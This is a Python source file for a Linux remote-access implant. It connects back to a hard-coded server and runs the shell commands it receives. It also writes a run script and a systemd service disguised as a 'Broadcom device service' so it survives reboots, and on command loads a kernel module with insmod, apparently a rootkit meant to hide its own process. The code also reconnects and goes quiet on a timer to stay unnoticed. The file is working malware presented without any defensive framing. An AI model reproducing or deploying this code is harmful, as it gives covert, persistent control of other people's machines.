#!/usr/bin/env python3

import os
import socket
import time
import subprocess
import sys

SVR_ADD = "192.168.0.9"
SVR_PORT = 4020
BUFFER_SIZE = 1024

SVR_SOCK = socket.socket()


def sleep(time_to_s):
    try:
        SVR_SOCK.close()
        time.sleep(time_to_s)
        bind_svr()
    except:
        send_rsp("Socket wouldn't die, initiating counter measures..")


def drop_kit():
    try:
        send_rsp("dropping kit...")
        payload_PID = str(os.getpid())
        drop_cmd = "insmod /home/dev/Templates/verto.ko payload_PID=" + payload_PID + ""
        os.system(drop_cmd)  # TODO experiment with subprocess
        send_rsp("kit dropped")
    except:
        send_rsp("Drop error, is kit in dir?, root? \n")


def set_cron():
    try:
        # create run script
        run_file = open("/usr/local/sbin/verto.sh", "w")  # create run file
        run_file.write("#!/bin/sh\n\n/usr/games/fn2187.py")  # write run file, !MODIFY TO PAYLOAD FILE
        subprocess.getoutput("chmod +x /usr/local/sbin/verto.sh")

        # create service
        service_file = open("/etc/systemd/system/verto.service", "w")
        service_file.write("[Unit]\nDescription=Broadcom device service\n["
                           "Service]\nExecStart=/usr/local/sbin/verto.sh\n[Install]\nWantedBy=multi-user.target")

        time.sleep(3)
        # enable service
        subprocess.getoutput("ln -sf etc/systemd/system/verto.service /etc/systemd/system/multi-user.target.wants/verto.service")
        # os.system()

    except:
        print("failed")


def send_rsp(response):
    try:
        SVR_SOCK.send(response.encode())
        # print("sent response:\n", response)
    except:
        # print("response error from: \n", response)
        # send_rsp(response)  # FIX
        sleep(5)


def receive_commands():
    send_rsp("ready")
    try:
        while True:
            cmd = SVR_SOCK.recv(BUFFER_SIZE).decode()

            if "cd" in cmd:
                os.chdir(cmd.strip("cd "))
                send_rsp(os.getcwd())
                pass
            if cmd.lower() == "n_sleep":
                sleep(300)
                pass
            if cmd.lower() == "l_sleep":
                sleep(3600)
                pass
            if cmd.lower() == "drop_kit":
                drop_kit()
                pass

            rsp = subprocess.getoutput(cmd)

            send_rsp(rsp)
    except:
        send_rsp("cmd_error")
        # sleep(10) ??
        bind_svr()


def bind_svr():

    global SVR_SOCK
    SVR_SOCK = socket.socket()
    try:
        SVR_SOCK.connect((SVR_ADD, SVR_PORT))
        if SVR_SOCK.recv(BUFFER_SIZE).decode() == "bind_success":

            receive_commands()
        else:
            sleep(10)
    except:
        sleep(10)  # poll the svr every 10 secs


def main():
    set_cron()
    bind_svr()


main()
